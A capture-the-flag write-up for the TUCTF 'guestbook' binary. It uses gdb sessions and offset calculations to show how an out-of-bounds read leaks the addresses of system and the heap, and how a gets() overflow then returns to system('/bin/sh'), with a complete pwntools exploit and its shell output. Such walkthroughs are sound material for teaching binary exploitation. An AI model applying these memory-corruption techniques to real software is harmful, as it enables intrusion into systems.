# guestbook

Full disclosure, I solved this challenged after the ctf was over.

Let's take a look at the binary:
```
$	file guestbook 
guestbook: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bc73592d4897267cd1097b0541dc571d051a7ca0, not stripped
$	pwn checksec guestbook 
[*] '/Hackery/tuctf/guestbook/guestbook'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So we can see that it is 32 bit elf, with a non executable stack and PIE enabled. Let's try running the binary:

```
$	./guestbook
Please setup your guest book:
Name for guest: #0
>>>00000
Name for guest: #1
>>>11111
Name for guest: #2
>>>22222
Name for guest: #3
>>>33333
---------------------------
1: View name
2: Change name
3. Quit
>>2
Which entry do you want to change?
>>>1
Enter the name of the new guest.
>>>15935

---------------------------
1: View name
2: Change name
3. Quit
>>1
Which entry do you want to view?
>>>1
15935
---------------------------
1: View name
2: Change name
3. Quit
>>1
Which entry do you want to view?
>>>6
@RW(DRW@DRWXDRW�I[
`T�
    ���XDRW
---------------------------
1: View name
2: Change name
3. Quit
>>3
```

So it prompts us for four names, then provides us the abillity to change or view the names. It appears that when we view the name of something past the four names we have, we get an infoleak. Looking at the code for the `Change name` option we can see a bug:

```
      case 2:
        printf("Which entry do you want to change?\n>>>");
        name_to_change = 0xFFFFFFFF;
        __isoc99_scanf("%d", &name_to_change);
        if ( name_to_change >= 0 )
        {
          printf("Enter the name of the new guest.\n>>>");
          do
            v8 = getchar();
          while ( v8 != 10 && v8 != -1 );
          gets(&vuln_input);
          strcpy(dest[name_to_change], &vuln_input);
        }
        else
        {
          puts("Enter a valid number");
        }
        break;
```

We can see that there is a call to gets, so we have a buffer overflow vulnerabillity. However before that happens, there is a `strcpy` call that uses a pointer which will be overwritten in the overflow (when we look at the stack, we see that it is between the start of our input and the return address). We will need an infoleak to leak a pointer which we can use in the overflow.

In addition to that, because PIE is enabled, the address of system (which is imported into the program) should change every time. We will need to get the address of system in order to execute a return to system attack.

Since we know that with the `View name` function we have an infoleak, let's take a look at the code for that:

```
int __cdecl readName(int dest_arg)
{
  int result; // eax@2
  int name_input; // [sp+0h] [bp-8h]@1

  printf("Which entry do you want to view?\n>>>");
  name_input = 0xFFFFFFFF;
  __isoc99_scanf("%d", &name_input);
  if ( name_input >= 0 )
    result = puts(*(const char **)(4 * name_input + dest_arg));
  else
    result = puts("Enter a valid number");
  return result;
}
```
 
 So we can see that it scans in a number, then will print out the address that is equal to `4` times the input (since the address is four bytes), from the start of the pointers. However it doesn't check to ensure that it isn't printing something beyond the four pointers to the names, so that is where we get the infoleak. Let's take a look at the memory in gdb to see what there is that we can leak:
 
```
 gdb-peda$ b *readName+0x65
Breakpoint 1 at 0x7b5
gdb-peda$ r
Starting program: /Hackery/tuctf/guestbook/guestbook 
Please setup your guest book:
Name for guest: #0
>>>00000
Name for guest: #1
>>>11111
Name for guest: #2
>>>22222
Name for guest: #3
>>>33333
---------------------------
1: View name
2: Change name
3. Quit
>>1
Which entry do you want to view?
>>>0

[----------------------------------registers-----------------------------------]
EAX: 0x56558008 ("00000")
EBX: 0x56557000 --> 0x1ef0 
ECX: 0x1 
EDX: 0x0 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0xffffd084 --> 0xffffd128 --> 0x0 
ESP: 0xffffd078 --> 0x56558008 ("00000")
EIP: 0x565557b5 (<readName+101>:	call   0x56555590 <puts@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565557b0 <readName+96>:	add    eax,edx
   0x565557b2 <readName+98>:	mov    eax,DWORD PTR [eax]
   0x565557b4 <readName+100>:	push   eax
=> 0x565557b5 <readName+101>:	call   0x56555590 <puts@plt>
   0x565557ba <readName+106>:	add    esp,0x4
   0x565557bd <readName+109>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565557c0 <readName+112>:	leave  
   0x565557c1 <readName+113>:	ret
Guessed arguments:
arg[0]: 0x56558008 ("00000")
[------------------------------------stack-------------------------------------]
0000| 0xffffd078 --> 0x56558008 ("00000")
0004| 0xffffd07c --> 0x0 
0008| 0xffffd080 --> 0x56557000 --> 0x1ef0 
0012| 0xffffd084 --> 0xffffd128 --> 0x0 
0016| 0xffffd088 ("\tYUV\374\320\377\377\276\320\377\377")
0020| 0xffffd08c --> 0xffffd0fc --> 0x56558008 ("00000")
0024| 0xffffd090 --> 0xffffd0be --> 0x5655 ('UV')
0028| 0xffffd094 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x565557b5 in readName ()
gdb-peda$ disas readName
Dump of assembler code for function readName:
   0x56555750 <+0>:	push   ebp
   0x56555751 <+1>:	mov    ebp,esp
   0x56555753 <+3>:	push   ebx
   0x56555754 <+4>:	sub    esp,0x4
   0x56555757 <+7>:	call   0x56555620 <__x86.get_pc_thunk.bx>
   0x5655575c <+12>:	add    ebx,0x18a4
   0x56555762 <+18>:	lea    eax,[ebx-0x15b0]
   0x56555768 <+24>:	push   eax
   0x56555769 <+25>:	call   0x56555540 <printf@plt>
   0x5655576e <+30>:	add    esp,0x4
   0x56555771 <+33>:	mov    DWORD PTR [ebp-0x8],0xffffffff
   0x56555778 <+40>:	lea    eax,[ebp-0x8]
   0x5655577b <+43>:	push   eax
   0x5655577c <+44>:	lea    eax,[ebx-0x158b]
   0x56555782 <+50>:	push   eax
   0x56555783 <+51>:	call   0x565555c0 <__isoc99_scanf@plt>
   0x56555788 <+56>:	add    esp,0x8
   0x5655578b <+59>:	mov    eax,DWORD PTR [ebp-0x8]
   0x5655578e <+62>:	test   eax,eax
   0x56555790 <+64>:	jns    0x565557a3 <readName+83>
   0x56555792 <+66>:	lea    eax,[ebx-0x1588]
   0x56555798 <+72>:	push   eax
   0x56555799 <+73>:	call   0x56555590 <puts@plt>
   0x5655579e <+78>:	add    esp,0x4
   0x565557a1 <+81>:	jmp    0x565557bd <readName+109>
   0x565557a3 <+83>:	mov    eax,DWORD PTR [ebp-0x8]
   0x565557a6 <+86>:	lea    edx,[eax*4+0x0]
   0x565557ad <+93>:	mov    eax,DWORD PTR [ebp+0x8]
   0x565557b0 <+96>:	add    eax,edx
   0x565557b2 <+98>:	mov    eax,DWORD PTR [eax]
   0x565557b4 <+100>:	push   eax
=> 0x565557b5 <+101>:	call   0x56555590 <puts@plt>
   0x565557ba <+106>:	add    esp,0x4
   0x565557bd <+109>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565557c0 <+112>:	leave  
   0x565557c1 <+113>:	ret    
End of assembler dump.
gdb-peda$ p $ebp+0x8
$1 = (void *) 0xffffd08c
gdb-peda$ x/x 0xffffd08c
0xffffd08c:	0xffffd0fc
gdb-peda$ x/x 0xffffd0fc
0xffffd0fc:	0x56558008
gdb-peda$ x/x 0x56558008
0x56558008:	0x30303030
gdb-peda$ telescope 0xffffd0fc
0000| 0xffffd0fc --> 0x56558008 ("00000")
0004| 0xffffd100 --> 0x56558428 ("11111")
0008| 0xffffd104 --> 0x56558440 ("22222")
0012| 0xffffd108 --> 0x56558458 ("33333")
0016| 0xffffd10c --> 0xa5559f1 
0020| 0xffffd110 --> 0xf7e33060 (<system>:	sub    esp,0xc)
0024| 0xffffd114 --> 0xffffd0fc --> 0x56558008 ("00000")
0028| 0xffffd118 --> 0x56558458 ("33333")
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0xf7e33060 <system>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f57a0f ("/bin/sh")
```
 
 So in the are of memory that it looks for pointers, we can see that `system` is in there which is nice. However keep in mind that `puts` looks for a pointer, which luckily  at the offset `24` we see that there is a pointer to the start of where the pointers are stored `0xffffd0fc`. Also between the start of the pointers and `system` there aren't any null bytes so we will leak the four pointers to the names, and the address of system. In order to leak this, we will need to input `6` since `6*4=24` which is the offset to the pointer.
 
 Also using the system address, we can calculate the address of `/bin/sh/`:

```
 >>> hex(0xf7f57a0f - 0xf7e33060)
'0x1249af'
```

Now that we have the infoleak, let's figure out how we need to execute the buffer overflow. We can do this using gdb:

```
gdb-peda$ b *main+0x1ca
Breakpoint 1 at 0x98c
gdb-peda$ r
Starting program: /Hackery/tuctf/guestbook/guestbook 
Please setup your guest book:
Name for guest: #0
>>>00000
Name for guest: #1
>>>11111
Name for guest: #2
>>>22222
Name for guest: #3
>>>3333
---------------------------
1: View name
2: Change name
3. Quit
>>2
Which entry do you want to change?
>>>0
Enter the name of the new guest.
>>>15935728

[----------------------------------registers-----------------------------------]
EAX: 0x56558008 ("00000")
EBX: 0x56557000 --> 0x1ef0 
ECX: 0xfbad2288 
EDX: 0xf7faf87c --> 0x0 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0xffffd128 --> 0x0 
ESP: 0xffffd090 ("15935728")
EIP: 0x5655598c (<main+458>:	lea    edx,[ebp-0x98])
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555982 <main+448>:	add    esp,0x4
   0x56555985 <main+451>:	mov    eax,DWORD PTR [ebp-0x34]
   0x56555988 <main+454>:	mov    eax,DWORD PTR [ebp+eax*4-0x2c]
=> 0x5655598c <main+458>:	lea    edx,[ebp-0x98]
   0x56555992 <main+464>:	push   edx
   0x56555993 <main+465>:	push   eax
   0x56555994 <main+466>:	call   0x56555570 <strcpy@plt>
   0x56555999 <main+471>:	add    esp,0x8
[------------------------------------stack-------------------------------------]
0000| 0xffffd090 ("15935728")
0004| 0xffffd094 ("5728")
0008| 0xffffd098 --> 0xf7fe2900 (dec    DWORD PTR [edi])
0012| 0xffffd09c --> 0xf7ffdc08 --> 0xf7fd7000 (jg     0xf7fd7047)
0016| 0xffffd0a0 --> 0xffffd0bf --> 0x56 ('V')
0020| 0xffffd0a4 --> 0x0 
0024| 0xffffd0a8 --> 0xc10000 
0028| 0xffffd0ac --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x5655598c in main ()
gdb-peda$ p $eax
$1 = 0x56558008
gdb-peda$ x/x 0x56558008
0x56558008:	0x30303030
gdb-peda$ x/x $ebp-0x2c
0xffffd0fc:	0x56558008
gdb-peda$ x/w $ebp-0x2c
0xffffd0fc:	0x56558008
gdb-peda$ find 15935728
Searching for '15935728' in: None ranges
Found 2 results, display max 2 items:
 [heap] : 0x56558020 ("15935728\n")
[stack] : 0xffffd090 ("15935728")
gdb-peda$ x/x $ebp-0x34
0xffffd0f4:	0x00
```

Calculate the offsets:
```
>>> hex(0xffffd0f4 - 0xffffd090)
'0x64'
>>> hex(0xffffd0fc - 0xffffd090)
'0x6c'
```

So in order for the `strcpy` call to be successful, we need to leave three things. The first is the pointer to an area of memory we are going to write to (we are just going to use the heap space allocated for the first name), an index that will point to that pointer, and data that can be written to the pointer without breaking anything. For the pointer, we can see that the offset is `0x6c`, and the pointer itself we can get from the infoleak earlier. The index we can see should be the integer `0x0` and is stored at an offset of `0x64` from the start of our input. Lastly, for the data that is being copied we can just have a null byte after the first four bytes of our input, since `strcpy` will only copy up untill that null byte but gets will continue reading untill a newline character.

Putting this all together we can write the exploit:

```
#Import pwntools
from pwn import *

#Establish the target process, and hand it over to gdb
target = process('./guestbook')
#gdb.attach(target)

#Establish the function which will create the first four names
def start():
	print target.recvuntil(">>>")
	target.sendline("15935")
	print target.recvuntil(">>>")
	target.sendline("75395")
	print target.recvuntil(">>>")
	target.sendline("01593")
	print target.recvuntil(">>>")
	target.sendline("25319")


#Create the function which will calculate the address of /bin/sh from the address of system, since they are both in libc
def calc_binsh(system_adr):
	binsh = system_adr + 0x1249af
	log.info("The address of binsh is: " + hex(binsh))
	return binsh

#Create the function which will create the payload and send it
def attack(system, binsh, heap):
	target.sendline("2")
	print target.recvuntil(">>>")
	target.sendline("0")
	print target.recvuntil(">>>")
	payload = "0"*0x4 + "\x00" + "1"*0x5f + p32(0x0) + "2"*0x4 + p32(heap) + "3"*0x2c + p32(system) + "4"*0x4 + p32(binsh)
	target.sendline(payload)

#Run the start function
start()

#Get the infoleak, for the address of system and the address of the heap space for the first name
print target.recvuntil(">>")
target.sendline("1")
print target.recvuntil(">>>")
target.sendline("6")
leak = target.recv(24)
print target.recvuntil(">>")
system_adr = u32(leak[20:24])
heap_adr = u32(leak[0:4])
log.info("The address of system is: " + hex(system_adr))
log.info("The address of heap is: " + hex(heap_adr))

#Calculate the address of /bin/sh
binsh = calc_binsh(system_adr)

#Launch the attack
attack(system_adr, binsh, heap_adr)

#Drop to an interactive shell
target.interactive()
```

Let's run the exploit:
```
$	python exploit.py 
[+] Starting local process './guestbook': pid 15437
Please setup your guest book:
Name for guest: #0
>>>
Name for guest: #1
>>>
Name for guest: #2
>>>
Name for guest: #3
>>>
---------------------------
1: View name
2: Change name
3. Quit
>>
Which entry do you want to view?
>>>
�Y\x8a\xffX��V
---------------------------
1: View name
2: Change name
3. Quit
>>
[*] The address of system is: 0xf75b3060
[*] The address of heap is: 0x5685b008
[*] The address of binsh is: 0xf76d7a0f
Which entry do you want to change?
>>>
Enter the name of the new guest.
>>>
[*] Switching to interactive mode
$ 
---------------------------
1: View name
2: Change name
3. Quit
>>$ 3
$ ls
core        leak.py    peda-session-dash.txt       Readme.md
exploit.py  libc.so.6  peda-session-guestbook.txt
guestbook   old.py     peda-session-w.procps.txt
$ w
 23:50:28 up  3:35,  1 user,  load average: 1.03, 0.87, 0.75
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               20:15    3:35m  6:30   0.04s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
```

Just like that, we popped a shell!
 
